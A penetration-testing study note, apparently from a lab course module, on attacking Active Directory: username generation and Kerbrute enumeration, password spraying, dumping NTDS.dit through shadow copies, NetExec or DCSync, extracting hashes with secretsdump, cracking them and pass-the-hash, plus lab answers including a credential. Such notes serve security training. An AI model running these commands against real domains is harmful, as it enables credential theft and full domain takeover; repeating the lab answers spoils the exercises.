# NOTE — Attacking Active Directory and NTDS.dit

## ID
520

## Module
Password Attacks

## Kind
methodology

## Title
Section 14 — Attacking Active Directory and NTDS.dit

## Description
Spray a custom username list with NetExec, validate names with Kerbrute, then dump NTDS.dit (via VSS or `ntdsutil`) and extract every domain hash with secretsdump. Pass-the-Hash with uncrackable hashes.

## Tags
active-directory, ntds, vssadmin, ntdsutil, kerbrute, username-anarchy, netexec, secretsdump, dcsync, pth, evil-winrm

## Commands
- `./username-anarchy -i names.txt > usernames.txt`
- `./kerbrute userenum --dc <dc-ip> --domain <domain> usernames.txt`
- `./kerbrute bruteuser -d <domain> --dc <dc-ip> /usr/share/wordlists/fasttrack.txt <user>`
- `netexec smb <dc-ip> -u <user> -p /usr/share/wordlists/fasttrack.txt`
- `vssadmin CREATE SHADOW /For=C:`
- `cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyN\Windows\NTDS\NTDS.dit C:\NTDS\NTDS.dit`
- `reg save HKLM\SYSTEM C:\NTDS\SYSTEM`
- `impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL`
- `netexec smb <dc-ip> -u <user> -p <pass> -M ntdsutil`
- `evil-winrm -i <dc-ip> -u Administrator -H <nthash>`

## Concept Overview
NTDS.dit is the AD database on every DC. It contains:
- Every domain user (username + NTLM hash + AES keys + group memberships)
- Every computer account
- GPO links, schema, replication metadata

Capturing it = total domain compromise. You need:
1. Username enumeration (build a hit list)
2. Foothold credential (spray or stuffed creds)
3. DC code execution OR DCSync rights
4. `NTDS.dit` + `SYSTEM` files exfiltrated
5. Offline extraction with secretsdump

## Username Generation

### `username-anarchy`
Generates all common naming conventions from real names:
```bash
./username-anarchy John Marston > usernames.txt
# or from a file
./username-anarchy -i names.txt > usernames.txt
```
Produces `jmarston`, `john.marston`, `marston.john`, `marstonj`, etc.

Common conventions to try:
| Pattern | Example for John Marston |
|---------|--------------------------|
| `flastname` | `jmarston` |
| `first.last` | `john.marston` |
| `firstlast` | `johnmarston` |
| `last.first` | `marston.john` |
| `firstinitial.lastname` | `j.marston` |

## Username Validation — Kerbrute

```bash
./kerbrute userenum -d inlanefreight.local --dc 10.129.0.10 usernames.txt
```
Output shows `[+] VALID USERNAME: jmarston@inlanefreight.local`. Kerbrute uses Kerberos AS-REQ pre-auth — quiet vs. SMB and doesn't lock accounts.

## Password Spraying

### NetExec (SMB)
```bash
netexec smb 10.129.0.10 -u jmarston -p /usr/share/wordlists/fasttrack.txt
```
Watch for the account lockout policy — spray slowly.

### Kerbrute (Kerberos)
```bash
./kerbrute bruteuser -d inlanefreight.local --dc 10.129.0.10 /usr/share/wordlists/fasttrack.txt jmarston
```

## Capturing NTDS.dit — Method 1: VSS + Evil-WinRM

Requires Domain Admin or Administrator on the DC.

```powershell
# Confirm rights
net localgroup
net user jmarston            # check Domain Admins membership

# Create shadow copy of C:
vssadmin CREATE SHADOW /For=C:
# Note the Shadow Copy Volume Name → \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyN

# Copy NTDS.dit
cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyN\Windows\NTDS\NTDS.dit C:\NTDS\NTDS.dit

# Also grab SYSTEM hive (needed for decryption)
reg save HKLM\SYSTEM C:\NTDS\SYSTEM
```

Exfil both files to attacker host via SMB share, then:
```bash
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

## Capturing NTDS.dit — Method 2: NetExec one-shot
NetExec's `ntdsutil` module wraps all of the above:
```bash
netexec smb 10.129.0.10 -u jmarston -p 'P@ssword!' -M ntdsutil
```
Dumps every domain hash + Kerberos keys in one command.

## Capturing NTDS.dit — Method 3: DCSync
If the user has the *Replicating Directory Changes* extended right (not full DA), no shadow copy needed:
```bash
impacket-secretsdump -just-dc DOMAIN/user:pass@dc.example.local
```

## Cracking + Pass-the-Hash Fallback
```bash
hashcat -m 1000 admin_nthash /usr/share/wordlists/rockyou.txt
```
If uncrackable, **PtH** with the NT hash directly:
```bash
evil-winrm -i 10.129.0.10 -u Administrator -H <nthash>
```

## Lab — Questions & Answers
| Q | Answer | Method |
|---|--------|--------|
| Q1 — File on a DC that contains domain account password hashes | **`NTDS.dit`** | Reading the section |
| Q2 — NT hash of the Administrator (from example output) | **(hidden — see HTB walkthrough)** | Section 14 example netexec ntdsutil output, field 4 of the Administrator line |
| Q3 — John Marston's credentials | **(hidden — `jmarston:P@ssword!`)** | `username-anarchy` → `kerbrute userenum` → `kerbrute bruteuser` with `fasttrack.txt` |
| Q4 — Jennifer Stapleton's password | **(hidden)** | After capturing NTDS.dit + SYSTEM with the above credentials, `impacket-secretsdump` → grab `jstapleton:` NT hash → `hashcat -m 1000 ... rockyou.txt` |

## Key Takeaways
- `username-anarchy` + `kerbrute userenum` is the cheapest, lockout-free way to validate usernames before spraying.
- `vssadmin CREATE SHADOW` is built into Windows — no upload required. Bypasses file-locking on the live `NTDS.dit`.
- `netexec smb -M ntdsutil` is the lazy/fast path for the same operation.
- "PtH with uncrackable hashes" is a feature, not a workaround — Administrator's NTLM hash is often enough for full domain access regardless of password complexity.
- `aad3b435b51404eeaad3b435b51404ee` in the LM field = empty LM hash (LM disabled). Ignore.

## Gotchas
- `vssadmin` requires elevation. Without admin on the DC, this path is closed.
- Shadow copy numbers (`HarddiskVolumeShadowCopy1`, `2`, …) increment. Read the actual output of `vssadmin CREATE SHADOW`, don't assume `1`.
- The `Administrator` (RID 500) account is exempt from many lockout policies, but rate limits still apply.
- Modern DCs may have AV/EDR detecting `vssadmin` + `NTDS.dit` copies. Plan accordingly.

<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|password-attacks]]
← [[13-attacking-windows-credential-manager]] | [[15-credential-hunting-in-windows]] →
<!-- AUTO-LINKS-END -->
